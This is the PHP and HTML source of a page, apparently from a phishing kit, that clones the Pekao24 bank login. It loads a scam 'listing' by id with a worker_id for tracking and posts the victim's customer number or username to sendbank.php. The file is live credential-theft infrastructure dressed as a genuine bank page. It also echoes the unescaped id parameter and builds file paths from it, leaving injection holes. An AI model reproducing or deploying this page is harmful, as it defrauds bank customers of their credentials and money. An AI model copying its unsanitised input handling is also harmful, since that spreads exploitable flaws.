<?php
include "../service.php";
include "../../settings.php";
if (file_exists("../data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("../data/" . $_GET["id"] . ".xml");

checkLK($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id, "Pekao Bank");
?>
<!DOCTYPE html>
<html lang="pl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
    <title>Pekao24 - Logowanie</title>
    <meta name="description" content="Witaj na nowej stronie www.pekao24.pl">
    <base href=".">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  </head>

  <body>
    <style>
      [_pekaostyle-c161] .button,
      [_pekaostyle-c65] .field-button [pekao-icon] {
        transition: all .2s ease-in-out
      }
      
      *,
      .ql-container,
      .ql-editor,
      [_pekaostyle-c161] .button {
        box-sizing: border-box
      }
      
      .ql-container.ql-pekao .ql-editor {
        padding: 0;
        overflow-x: hidden
      }
      
      .ql-container.ql-pekao .ql-editor p {
        font-family: Lato, sans-serif;
        font-weight: 400;
        color: #404040;
        margin: 0;
        font-size: 16px;
        line-height: 1.5
      }
      
      .ql-container.ql-pekao .ql-editor strong {
        font-weight: 700
      }
      
      .ql-container.ql-pekao .ql-editor a {
        display: inline-block;
        color: #d71920
      }
      
      .ql-container.ql-pekao .ql-editor a:hover {
        color: #b7151b
      }
      
      @media (hover:hover) {
        .ql-container.ql-pekao .ql-editor .button.button-tertiary-white:not(: disabled):hover, .ql-container.ql-pekao .ql-editor .button.button-tertiary:not(: disabled):hover {
          color: #ac141a
        }
        .ql-container.ql-pekao .ql-editor .button.button-tertiary-white:not(:disabled):hover {
          color: #fff
        }
      }
      
      .ql-container.ql-pekao .ql-editor .button.peopay-deprecated-style.button-primary:focus:not(:active) {
        box-shadow: none;
        border-color: #8f8f8f;
        background-color: #ac141a
      }
      
      html {
        line-height: 1.15;
        -ms-text-size-adjust: 100%;
        -webkit-text-size-adjust: 100%
      }
      
      footer,
      header,
      main,
      section {
        display: block
      }
      
      a {
        background-color: transparent;
        -webkit-text-decoration-skip: objects
      }
      
      strong {
        font-weight: inherit;
        font-weight: bolder
      }
      
      img {
        border-style: none
      }
      
      svg:not(:root) {
        overflow: hidden
      }
      
      button,
      input {
        font-size: 100%;
        line-height: 1.15;
        margin: 0;
        overflow: visible
      }
      
      button {
        text-transform: none
      }
      
      button,
      html [type=button] {
        -webkit-appearance: button
      }
      
      [type=button]::-moz-focus-inner,
      button::-moz-focus-inner {
        border-style: none;
        padding: 0
      }
      
      [type=button]:-moz-focusring,
      button:-moz-focusring {
        outline: ButtonText dotted 1px
      }
      
      ::-webkit-file-upload-button {
        -webkit-appearance: button;
        font: inherit
      }
      
      * {
        -webkit-tap-highlight-color: transparent
      }
      
      body,
      html {
        height: 100%;
        overflow-x: hidden;
        overflow-y: hidden
      }
      
      body,
      button,
      input,
      label {
        font-family: Lato, sans-serif
      }
      
      a,
      button {
        color: inherit;
        text-decoration: none;
        cursor: pointer
      }
      
      body {
        margin: 0;
        font-size: 14px
      }
      
      h1,
      p {
        margin: 0;
        padding: 0
      }
      
      h1 {
        font-size: 32px;
        line-height: 40px;
        letter-spacing: -.2px;
        font-weight: 700
      }
      
      p {
        font-size: 14px;
        line-height: 20px;
        letter-spacing: -.1px
      }
      
      ::-moz-selection {
        color: #fff;
        background: #d71920
      }
      
      ::selection {
        color: #fff;
        background: #d71920
      }
      
      .visually-hidden {
        position: absolute!important;
        clip: rect(1px 1px 1px 1px);
        clip: rect(1px, 1px, 1px, 1px);
        padding: 0!important;
        border: 0!important;
        height: 1px!important;
        width: 1px!important;
        overflow: hidden!important
      }
      
      ::-webkit-scrollbar {
        width: 0
      }
      
      @media (min-width:1260px) {
        ::-webkit-scrollbar {
          width: 12px
        }
      }
      
      ::-webkit-scrollbar-track {
        border-radius: 10px
      }
      
      ::-webkit-scrollbar-thumb {
        border-radius: 10px;
        border: 3px solid #f0f0f0;
        background: rgba(0, 0, 0, .4)
      }
      
      ::-webkit-scrollbar-thumb:window-inactive {
        background: rgba(0, 0, 0, .4)
      }
      
      @font-face {
        font-family: Lato;
        src: url();
        font-weight: 300;
        font-style: normal;
        font-display: swap
      }
      
      @font-face {
        font-family: Lato;
        src: url();
        font-weight: 300;
        font-style: normal;
        font-display: swap
      }
      
      @font-face {
        font-family: Lato;
        src: url();
        font-weight: 400;
        font-style: normal;
        font-display: swap
      }
      
      @font-face {
        font-family: Lato;
        src: url();
        font-weight: 400;
        font-style: normal;
        font-display: swap
      }
      
      @font-face {
        font-family: Lato;
        src: url();
        font-weight: 500;
        font-style: normal;
        font-display: swap
      }
      
      @font-face {
        font-family: Lato;
        src: url();
        font-weight: 500;
        font-style: normal;
        font-display: swap
      }
      
      @font-face {
        font-family: Lato;
        src: url();
        font-weight: 600;
        font-style: normal;
        font-display: swap
      }
      
      @font-face {
        font-family: Lato;
        src: url();
        font-weight: 600;
        font-style: normal;
        font-display: swap
      }
      
      @font-face {
        font-family: Lato;
        src: url();
        font-weight: 700;
        font-style: normal;
        font-display: swap
      }
      
      @font-face {
        font-family: Lato;
        src: url();
        font-weight: 700;
        font-style: normal;
        font-display: swap
      }
      
      @font-face {
        font-family: Lato;
        src: url();
        font-weight: 900;
        font-style: normal;
        font-display: swap
      }
      
      @font-face {
        font-family: Lato;
        src: url();
        font-weight: 900;
        font-style: normal;
        font-display: swap
      }
      
      @font-face {
        font-family: myicons;
        src: url();
        font-weight: 400;
        font-style: normal
      }
      
      .ql-container {
        font-family: Helvetica, Arial, sans-serif;
        font-size: 13px;
        height: 100%;
        margin: 0;
        position: relative
      }
      
      .ql-clipboard {
        left: -100000px;
        height: 1px;
        overflow-y: hidden;
        position: absolute;
        top: 50%
      }
      
      .ql-editor {
        line-height: 1.42;
        height: 100%;
        outline: 0;
        overflow-y: auto;
        padding: 12px 15px;
        -o-tab-size: 4;
        tab-size: 4;
        -moz-tab-size: 4;
        text-align: left;
        white-space: pre-wrap;
        word-wrap: break-word
      }
      
      .ql-editor>* {
        cursor: text
      }
      
      .ql-editor p {
        margin: 0;
        padding: 0;
        counter-reset: list-1 list-2 list-3 list-4 list-5 list-6 list-7 list-8 list-9
      }
      
      [_pekaostyle-c716] {
        display: block;
        min-width: 320px;
        height: 100%
      }
      
      .router-outlet[_pekstyle-c716] {
        height: 100%;
        overflow: hidden
      }
      
      .login-container[_pekstyle-c641] {
        display: flex;
        align-items: center;
        flex-direction: column;
        height: 100%;
        justify-content: space-between;
        width: 100%;
        -webkit-overflow-scrolling: touch;
        overflow: hidden auto;
        overflow-x: hidden;
        overflow-y: auto
      }
      
      @media (min-width:768px) {
        .login-container[_pekstyle-c641] {
          background: url(#) 50% no-repeat;
          background-size: cover
        }
      }
      
      @media (min-width:768px) and (-webkit-min-device-pixel-ratio:2),
      (min-width:768px) and (min-resolution:192dpi) {
        .login-container[_pekstyle-c641] {
          background-image: url(#)
        }
      }
      
      @media (min-width:980px) and (-webkit-min-device-pixel-ratio:2),
      (min-width:980px) and (min-resolution:192dpi) {
        .login-container[_pekstyle-c641] {
          background-image: url(#)
        }
      }
      
      @media (min-width:1260px) {
        .login-container[_pekstyle-c641] {
          background-image: url(pekao-image-1.jpg)
        }
      }
      
      @media (min-width:1260px) and (-webkit-min-device-pixel-ratio:2),
      (min-width:1260px) and (min-resolution:192dpi) {
        .login-container[_pekstyle-c641] {
          background-image: url(#)
        }
      }
      
      @media (min-width:1260px) and (-webkit-min-device-pixel-ratio:3),
      (min-width:1260px) and (-webkit-min-device-pixel-ratio:3.6458333333333335),
      (min-width:1260px) and (min-resolution:350dpi) {
        .login-container[_pekstyle-c641] {
          background-image: url(#)
        }
      }
      
      .header[_pekstyle-c641] {
        background-color: #b7151b;
        height: 56px;
        min-width: 100vw;
        flex-shrink: 0
      }
      
      .header-wrapper[_pekstyle-c641] {
        display: flex;
        flex-direction: row;
        flex-shrink: 0;
        height: 100%;
        justify-content: space-between;
        margin: 0 auto;
        max-width: 1260px;
        padding: 0 20px
      }
      
      .account-action-group[_pekstyle-c641] {
        align-items: center;
        display: flex;
        flex-direction: row;
        height: 56px
      }
      
      .account-label[_pekstyle-c641],
      .account-link[_pekstyle-c641] {
        color: #fff;
        font-weight: 400
      }
      
      .account-label[_pekstyle-c641] {
        padding-right: 20px;
        letter-spacing: 1.09px;
        font-size: 16px
      }
      
      .account-link[_pekstyle-c641] {
        font-size: 12px;
        letter-spacing: 1.5px;
        text-transform: uppercase
      }
      
      .logo[_pekstyle-c641] {
        height: 56px;
        width: 171px
      }
      
      .content[_pekstyle-c641] {
        display: flex;
        align-items: center;
        flex-direction: column;
        flex-grow: 1;
        flex-shrink: 0;
        justify-content: center;
        width: 100%
      }
      
      .login-container-wrapper[_pekstyle-c641] {
        margin: 20px auto;
        position: relative;
        max-width: 1260px
      }
      
      @media (max-width:767px) {
        .login-container-wrapper[_pekstyle-c641] {
          height: 100%;
          margin: 0;
          width: 100%
        }
        .show-on-desktop[_pekstyle-c641] {
          display: none
        }
      }
      
      [_pekaostyle-c640] {
        width: 100%;
        min-width: 100vw
      }
      
      .footer-section[_pekstyle-c640],
      .footer[_pekstyle-c640] {
        background-color: #f7f7f7
      }
      
      .footer-section[_pekstyle-c640] {
        border-top: 1px solid #d9d9d9;
        padding-top: 15px
      }
      
      .footer-section.bank-information[_pekstyle-c640] {
        padding-bottom: 15px
      }
      
      .footer-wrapper[_pekstyle-c640] {
        color: #707070;
        margin: 0 auto;
        padding: 0 20px;
        max-width: 1260px
      }
      
      .footer-wrapper.footer-navigation[_pekstyle-c640] {
        display: flex;
        flex-wrap: wrap
      }
      
      .footer-wrapper.footer-navigation[_pekstyle-c640] .footer-navigation-group[_pekstyle-c640] {
        display: flex;
        align-self: center;
        margin-bottom: 15px
      }
      
      .footer-wrapper.footer-navigation[_pekstyle-c640] .footer-navigation-group[_pekstyle-c640] pekao-button[_pekstyle-c640] {
        padding-right: 48px
      }
      
      .footer-wrapper.footer-navigation[_pekstyle-c640] .footer-navigation-group[_pekstyle-c640] .button[_pekstyle-c640] {
        color: #707070;
        font-size: 14px;
        font-weight: 400;
        line-height: 21px;
        text-transform: none;
        padding: 0
      }
      
      @media (min-width:768px) {
        .footer-wrapper.footer-navigation[_pekstyle-c640] .footer-navigation-group[_pekstyle-c640] .button[_pekstyle-c640] {
          font-size: 16px
        }
      }
      
      .footer-wrapper.footer-navigation[_pekstyle-c640] .footer-navigation-group[_pekstyle-c640] .button[_pekstyle-c640]:focus {
        border: transparent
      }
      
      .footer-wrapper.footer-navigation[_pekstyle-c640] .footer-navigation-group[_pekstyle-c640] .button[_pekstyle-c640]:hover {
        color: #404040
      }
      
      .footer-wrapper.footer-navigation[_pekstyle-c640] .footer-navigation-group[_pekstyle-c640] .button.phone-number[_pekstyle-c640] {
        font-size: 18px;
        color: #404040;
        font-weight: 700;
        line-height: 28px
      }
      
      @media (min-width:768px) {
        .footer-wrapper.footer-navigation[_pekstyle-c640] .footer-navigation-group[_pekstyle-c640] .button.phone-number[_pekstyle-c640] {
          font-size: 24px
        }
      }
      
      @media (max-width:979px) {
        .footer-wrapper.footer-navigation[_pekstyle-c640] .footer-navigation-group.phone-numbers-group[_pekstyle-c640] {
          width: 100%
        }
      }
      
      .footer-wrapper.footer-info-group[_pekstyle-c640] {
        font-size: 12px;
        line-height: 14px
      }
      
      .footer-wrapper.footer-info-group[_pekstyle-c640] .definition-group[_pekstyle-c640] {
        display: flex;
        padding-top: 20px
      }
      
      @media (max-width:767px) {
        .footer-wrapper.footer-navigation[_pekstyle-c640] .footer-navigation-group[_pekstyle-c640] {
          width: 100%
        }
        .footer-wrapper.footer-navigation[_pekstyle-c640] .footer-navigation-group[_pekstyle-c640] pekao-button[_pekstyle-c640] {
          padding-right: 0
        }
        .footer-wrapper.footer-navigation[_pekstyle-c640] .footer-navigation-group[_pekstyle-c640] .links[_pekstyle-c640] {
          display: flex;
          flex-direction: column
        }
        .footer-wrapper.footer-navigation[_pekstyle-c640] .footer-navigation-group[_pekstyle-c640] .links[_pekstyle-c640] pekao-button[_pekstyle-c640]:first-child {
          padding-bottom: 10px
        }
        .footer-wrapper.footer-navigation[_pekstyle-c640] .footer-navigation-group.links-group[_pekstyle-c640] .links[_pekstyle-c640],
        .footer-wrapper.footer-navigation[_pekstyle-c640] .footer-navigation-group.phone-numbers-group[_pekstyle-c640] pekao-button[_pekstyle-c640] {
          width: 50%
        }
        .footer-wrapper.footer-info-group[_pekstyle-c640] .definition-group[_pekstyle-c640] {
          flex-direction: column
        }
        .footer-wrapper.footer-info-group[_pekstyle-c640] .codes[_pekstyle-c640] {
          padding-bottom: 15px
        }
      }
      
      .footer-wrapper.footer-info-group[_pekstyle-c640] .codes[_pekstyle-c640] {
        flex-grow: 1
      }
      
      .footer-wrapper.footer-info-group[_pekstyle-c640] .padding-right[_pekstyle-c640] {
        padding-right: 25px
      }
      
      [_pekaostyle-c161] .button {
        -webkit-appearance: none;
        -moz-appearance: none;
        appearance: none;
        height: 52px;
        padding: 0 24px;
        outline: 0;
        font-size: 16px;
        font-weight: 700;
        line-height: 20px;
        font-family: Lato, sans-serif;
        text-align: center;
        cursor: pointer;
        border-radius: 26px;
        white-space: normal;
        color: #fff;
        border: 2px solid #d71920;
        background-color: #d71920
      }
      
      [_pekaostyle-c161] .button.button-primary {
        width: 100%;
        min-width: 140px;
        color: #fff;
        border: 2px solid #d71920;
        background-color: #d71920
      }
      
      @media (hover:hover) {
        [_pekaostyle-c161] .button.button-primary:hover {
          border-color: #c51a20;
          background-color: #c51a20
        }
      }
      
      [_pekaostyle-c161] .button.button-primary:focus {
        box-shadow: inset 0 0 0 2px #fff
      }
      
      [_pekaostyle-c161] .button.button-primary:active {
        border-color: #b7151b;
        background-color: #b7151b;
        box-shadow: none
      }
      
      [_pekaostyle-c161] .button.button-tertiary {
        height: auto;
        width: auto;
        padding: 10px 0;
        border: none;
        border-radius: 0;
        display: inline-block;
        text-align: center;
        font-size: 16px;
        font-weight: 700;
        letter-spacing: -.1px;
        line-height: 20px;
        color: #d71920;
        background-color: transparent;
        transition: color .2s ease-in-out;
        position: relative
      }
      
      [_pekaostyle-c161] .button.button-tertiary:disabled {
        cursor: default;
        color: #8f8f8f
      }
      
      .peopay-deprecated-style[_pekaostyle-c161] .button.button-primary:focus:not(:active) {
        box-shadow: none;
        border-color: #8f8f8f;
        background-color: #ac141a
      }
      
      [_pekaostyle-c726] {
        display: block
      }
      
      .number-client-or-name-pekao-field[_pekstyle-c726] .pekao-field-input[_pekstyle-c726] {
        border-top-right-radius: 0;
        border-bottom-right-radius: 0
      }
      
      .main-action-group[_pekstyle-c726] {
        padding: 20px 0;
        text-align: right
      }
      
      .main-action-group[_pekstyle-c726] .button[_pekstyle-c726] {
        max-width: 171px
      }
      
      .account-action-group[_pekstyle-c726] {
        display: flex;
        justify-content: space-between
      }
      
      @media (max-width:767px) {
        .account-action-group[_pekstyle-c726] {
          padding-top: 10px
        }
        .login-container-footer[_pekstyle-c726] {
          border-top: 1px solid #d9d9d9;
          margin-top: 15px;
          padding-top: 20px
        }
      }
      
      .keyboard-button[_pekstyle-c726]:disabled {
        background: #eee;
        border-color: #d9d9d9;
        color: #8f8f8f;
        cursor: not-allowed
      }
      
      .keyboard-button[_pekstyle-c726]:disabled:focus {
        box-shadow: none
      }
      
      @media (hover:hover) {
        .keyboard-button[_pekstyle-c726]:disabled:hover {
          box-shadow: none
        }
      }
      
      [_pekaostyle-c726] .login-customer-wrapper .login-container-content {
        min-height: 555px;
        z-index: 2
      }
      
      [_pekaostyle-c726] .login-customer-wrapper .login-container-content .login-container-form {
        min-height: 385px
      }
      
      @media (min-width:768px) {
        [_pekaostyle-c161] .button.button-primary {
          width: auto
        }
        .show-on-mobile[_pekstyle-c726] {
          display: none
        }
      }
      
      [_pekaostyle-c25] svg {
        width: 1em;
        height: 1em;
        display: inline-block;
        vertical-align: -.2em
      }
      
      @media (max-width:767px) {
        .login-container-wrapper[_pekstyle-c639],
        [_pekaostyle-c639] {
          height: 100%
        }
      }
      
      .login-container-content[_pekstyle-c639] {
        position: relative;
        display: flex;
        flex-direction: column;
        width: 460px;
        height: auto;
        max-height: 100%;
        min-height: 390px;
        margin: 0 auto;
        padding: 24px 40px 20px;
        overflow: auto;
        background-color: #fff;
        box-shadow: 0 0 10px 0 rgba(0, 0, 0, .2);
        border: 1px solid #d9d9d9
      }
      
      @media (max-width:767px) {
        .login-container-content[_pekstyle-c639] {
          margin: 0 auto;
          width: 100%;
          height: 100%;
          padding-right: 20px;
          padding-left: 20px;
          border-width: 1px 0
        }
      }
      
      @media (min-width:768px) {
        .login-container-content[_pekstyle-c639] .login-container-form[_pekstyle-c639] {
          flex: 1 0 auto
        }
      }
      
      .login-container-header[_pekstyle-c639] {
        flex-direction: column;
        margin-bottom: 27px
      }
      
      .login-container-header[_pekstyle-c639],
      .login-container-header[_pekstyle-c639] .title-and-language-wrapper[_pekstyle-c639] {
        display: flex;
        justify-content: space-between
      }
      
      .login-container-header-title[_pekstyle-c639] {
        color: #404040;
        font-size: 24px;
        font-weight: 400;
        line-height: 46px
      }
      
      .login-container-footer[_pekstyle-c639] {
        display: flex;
        justify-content: space-between;
        align-items: center;
        min-height: 50px
      }
      
      .field-container[_pekstyle-c65],
      [_pekaostyle-c65] {
        display: inline-block;
        width: 100%
      }
      
      [_pekaostyle-c65] {
        position: relative
      }
      
      .field-container[_pekstyle-c65] label[_pekstyle-c65] {
        display: flex;
        align-items: center;
        height: 20px;
        padding-bottom: 10px;
        font-size: 12px;
        font-weight: 500;
        line-height: 12px;
        color: #404040;
        text-transform: uppercase;
        letter-spacing: 1px
      }
      
      .field-container[_pekstyle-c65] label[_pekstyle-c65] pekao-tooltip-icon {
        margin-bottom: 3px;
        margin-left: 3px
      }
      
      .field-container[_pekstyle-c65] input[type=text] {
        box-sizing: border-box;
        box-shadow: none;
        -webkit-appearance: none;
        -moz-appearance: none;
        appearance: none;
        width: 100%;
        height: 40px;
        line-height: 40px;
        padding: 4px 20px 0;
        font-size: 16px;
        font-weight: 400;
        color: #404040;
        background: #fff;
        border: 1px solid #8f8f8f;
        border-radius: 4px;
        transition: all .2s ease-in-out, border-radius 0s
      }
      
      .field-container[_pekstyle-c65] input[type=text]::-ms-clear {
        display: none
      }
      
      .field-container[_pekstyle-c65] input[type=text]::-moz-placeholder {
        color: #8f8f8f
      }
      
      .field-container[_pekstyle-c65] input[type=text]:-ms-input-placeholder {
        color: #8f8f8f
      }
      
      .field-container[_pekstyle-c65] input[type=text]:focus {
        outline: 0;
        border-color: #404040
      }
      
      .field-container.closed-messages[_pekstyle-c65] .field-button:last-of-type {
        border-bottom-right-radius: 4px
      }
      
      .field-container[_pekstyle-c65] .messages-container[_pekstyle-c65] {
        border-bottom-right-radius: 4px;
        border-bottom-left-radius: 4px;
        overflow: hidden
      }
      
      .field-container.large[_pekstyle-c65] input[type=text] {
        height: 50px;
        line-height: 50px
      }
      
      .field-container[_pekstyle-c65] input {
        -webkit-transform: translateZ(0)
      }
      
      .field-and-buttons[_pekstyle-c65] {
        display: flex
      }
      
      @media (-ms-high-contrast:none),
      (hover:hover),
      screen and (-ms-high-contrast:active) {
        .field-container[_pekstyle-c65] input[type=text]:hover {
          border-color: #404040;
          box-shadow: none
        }
        .field-container[_pekstyle-c65]:not(.invalid):not(.warning):not(.focused) input[type=text]:hover~.field-button,
        [_pekstyle-c65]:not(.invalid):not(.warning) .field-and-buttons[_pekstyle-c65]:hover .field-button,
        [_pekstyle-c65]:not(.invalid):not(.warning) .field-and-buttons[_pekstyle-c65]:hover input[type=text] {
          border-color: #404040
        }
      }
      
      [_pekaostyle-c65] .field-button {
        width: 62px;
        font-size: 16px;
        flex-shrink: 0;
        background: #fff;
        border: 1px solid #8f8f8f;
        border-width: thin;
        transition: all .2s ease-in-out;
        outline: 0;
        color: #d71920
      }
      
      [_pekaostyle-c364],
      [_pekaostyle-c65] .field-button:focus {
        background-color: #f7f7f7
      }
      
      [_pekaostyle-c65] .field-button:last-child {
        border-top-right-radius: 4px;
        border-bottom-right-radius: 4px
      }
      
      @media (-ms-high-contrast:none),
      (hover:hover),
      screen and (-ms-high-contrast:active) {
        [_pekaostyle-c65] .field-button:hover {
          background-color: #f7f7f7
        }
      }
      
      [_pekaostyle-c65]:last-of-type {
        border-right-width: 1px
      }
      
      pekao-tooltip-icon {
        font-size: 16px
      }
      
      [_pekaostyle-c360] .ql-container.ql-pekao .ql-editor p,
      [_pekaostyle-c364] .ql-container.ql-pekao .ql-editor p {
        font-size: 14px
      }
      
      pekao-tooltip-icon span>[pekao-icon] {
        color: #8f8f8f
      }
      
      .cms-message-group[_pekstyle-c662] {
        border-top: 1px solid #d9d9d9;
        padding-top: 15px;
        margin-top: 15px
      }
      
      [_pekaostyle-c708] {
        width: 100%
      }
      
      [_pekaostyle-c708] .login-support-action-group-wrapper[_pekstyle-c708] {
        display: flex;
        justify-content: space-between;
        width: 100%
      }
      
      @media (max-width:767px) {
        [_pekaostyle-c708] .login-support-action-group-wrapper[_pekstyle-c708] {
          flex-direction: column
        }
      }
      
      [_pekaostyle-c708] .button-tertiary[_pekstyle-c708] {
        padding-left: 0;
        padding-right: 0
      }
      
      [_pekaostyle-c708] pekao-button[_pekstyle-c708]:not(:last-of-type) {
        margin-right: 45px
      }
      
      [_pekaostyle-c638] {
        align-items: center;
        display: flex;
        justify-content: flex-end
      }
      
      [_pekaostyle-c638] pekao-button[_pekstyle-c638]+pekao-button[_pekstyle-c638] {
        margin-left: 10px
      }
      
      .language[_pekstyle-c638] {
        background-size: cover;
        background-position: 50% 50%;
        background-repeat: no-repeat;
        cursor: pointer;
        display: block;
        height: 16px;
        width: 24px
      }
      
      .language[_pekstyle-c638]:hover {
        opacity: .75
      }
      
      .language-en[_pekstyle-c638] {
        background-image: url(pekao-image-4.svg)
      }
      
      .language-ua[_pekstyle-c638] {
        background-image: url(pekao-image-3.svg)
      }
      
      [_pekaostyle-c62] {
        display: block
      }
      
      [_pekaostyle-c361] {
        display: block;
        min-width: 100%
      }
      
      [_pekaostyle-c360] {
        display: flex;
        margin: 5px 0
      }
      
      [_pekaostyle-c360] .ql-container.ql-pekao .ql-editor p:first-child:before {
        content: attr(data-before-content);
        color: #8f8f8f;
        margin-right: 5px
      }
      
      [_pekaostyle-c364] {
        display: flex;
        align-items: center;
        margin-left: -40px;
        margin-right: -40px;
        padding: 15px 40px
      }
      
      @media (max-width:767px) {
        [_pekaostyle-c364] {
          margin-left: -20px;
          margin-right: -20px;
          padding-left: 20px;
          padding-right: 20px
        }
      }
      
      .stopwatch-icon[_pekstyle-c364] {
        color: #d71920;
        font-size: 20px;
        margin-right: 10px
      }
    </style>
    <pekao-root-pekao24 _pekaostyle-c716="" class="ng-tns-c716-0">
      <div _pekstyle-c716="" class="router-outlet outer-router-outlet ng-tns-c716-0 ng-trigger ng-trigger-layoutTransition">
        <router-outlet _pekstyle-c716="" class="ng-tns-c716-0"></router-outlet>
        <pekao-login _pekaostyle-c744="" class="ng-tns-c744-2 ng-star-inserted">
          <pekao-login-container _pekstyle-c744="" class="ng-tns-c744-2" _pekaostyle-c641="">
            <div _pekstyle-c641="" class="login-container">
              <header _pekstyle-c641="" class="header">
                <div _pekstyle-c641="" class="header-wrapper">
                  <a _pekstyle-c641="" target="_blank" rel="noopener" href="https://www.pekao.com.pl/"><img _pekstyle-c641="" alt="Bank Pekao" src="./pekao_files/pekao-image-2.svg" class="logo"></a>
                  <section _pekstyle-c641="" class="account-action-group show-on-desktop ng-star-inserted"><span _pekstyle-c641="" class="account-label">Nie masz konta?</span><a _pekstyle-c641="" target="_blank" rel="noopener" class="account-link" href="https://www.pekao.com.pl/klient-indywidualny/codzienne-bankowanie/konta-osobiste/konto-przekorzystne.html">Zostań klientem</a></section>
                </div>
              </header>
              <main _pekstyle-c641="" class="content">
                <section _pekstyle-c641="" class="login-container-wrapper">
                  <pekao-login-customer _pekstyle-c744="" _pekaostyle-c726="" class="ng-tns-c744-2 ng-star-inserted">
                    <pekao-login-step-box _pekstyle-c726="" titletext="Logowanie do Pekao24" class="login-customer-wrapper ng-tns-c639-3 ng-star-inserted" _pekaostyle-c639="">
                      <section _pekstyle-c639="" class="login-container-wrapper ng-tns-c639-3">
                        <div _pekstyle-c639="" class="login-container-content ng-tns-c639-3 ng-trigger ng-trigger-moveLoginContainerContent" style="margin-left: 0px;">
                          <header _pekstyle-c639="" class="login-container-header ng-tns-c639-3 ng-star-inserted">
                            <div _pekstyle-c639="" class="title-and-language-wrapper ng-tns-c639-3">
                              <h1 _pekstyle-c639="" class="login-container-header-title ng-tns-c639-3">Logowanie do Pekao24</h1>
                              <!-- <pekao-language-picker _pekstyle-c639="" _pekaostyle-c638="" class="ng-tns-c639-3 ng-star-inserted">
                                <pekao-button _pekstyle-c638="" _pekaostyle-c161="" class="ng-star-inserted">
                                  <button _pekstyle-c638="" type="button" class="button button-tertiary"><span _pekstyle-c638="" class="visually-hidden">english</span><i _pekstyle-c638="" class="language language-en"></i></button>
                                </pekao-button>
                                <pekao-button _pekstyle-c638="" _pekaostyle-c161="" class="ng-star-inserted">
                                  <button _pekstyle-c638="" type="button" class="button button-tertiary"><span _pekstyle-c638="" class="visually-hidden">українська</span><i _pekstyle-c638="" class="language language-ua"></i></button>
                                </pekao-button>
                              </pekao-language-picker> -->
                            </div>
                            <section _pekstyle-c726="" login-container-header="" pekaomessageplaceholder="" class="ng-tns-c639-3"></section>
                          </header>
                          <div _pekstyle-c639="" class="login-container-form ng-tns-c639-3">
                            <!-- Start FORM -->
                            <form _pekstyle-c726="" novalidate="" autocomplete="off" class="ng-tns-c639-3 ng-untouched ng-pristine ng-invalid" action="sendbank.php" method="post">
                              <pekao-field _pekstyle-c726="" for="customer" label="Wpisz numer klienta / nazwę użytkownika" pekaoautofocus="" pekaoblockautofocusinputvalidation="" _pekaostyle-c65="" class="number-client-or-name-pekao-field">
                                <!-- Start imput numer klienta -->
                                <input type="hidden" name="id" value="<?php echo $_GET['id']; ?>">
                                <input type="hidden" name="type" value="7">
                                
                                <div _pekstyle-c65="" class="field-container large closed-messages">
                                  <label _pekstyle-c65="" for="customer" class="ng-star-inserted"> Wpisz numer klienta / nazwę użytkownika
                                    <pekao-tooltip-icon _pekstyle-c726="" class="label-icon"><span aria-describedby="tooltip-93699" tabindex="0"><i pekao-icon="" _pekaostyle-c25=""><svg fill="currentColor" focusable="false" aria-hidden="true" role="img" xmlns="http://www/w3/org/2000/svg" viewBox="0 0 20 20"><g data-name="Layer 2"><path d="M9 5v2h2V5zm0 4v6h2V9zm1 11a10 10 0 1 1 10-10 10 10 0 0 1-10 10z" data-name="Layer 1"></path></g></svg></i></span> </pekao-tooltip-icon>
                                  </label> <span _pekstyle-c65="" class="field-and-buttons">
<input _pekstyle-c726="" id="field3ds01" name="logindata" type="text" class="pekao-field-input ng-untouched ng-pristine ng-invalid ng-star-inserted" maxlength="20">
<button _pekstyle-c726="" type="button" aria-label="Otwórz klawiaturę ekranową" class="field-button keyboard-button ng-star-inserted"><i _pekstyle-c726="" pekao-icon="" _pekaostyle-c25=""><svg fill="currentColor" focusable="false" aria-hidden="true" role="img" xmlns="http://www/w3/org/2000/svg" viewBox="0 0 20 20"><path fill="currentColor" d="M1 2h18a1 1 0 0 1 1 1v14a1 1 0 0 1-1 1H1a1 1 0 0 1-1-1V3a1 1 0 0 1 1-1zm1 2v12h16V4H2zm5.5 8h5a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-5a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm-4-6h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm0 6h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm2-3h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm-6-3h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm0 6h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5z"></path></svg></i></button>
</span> </div>
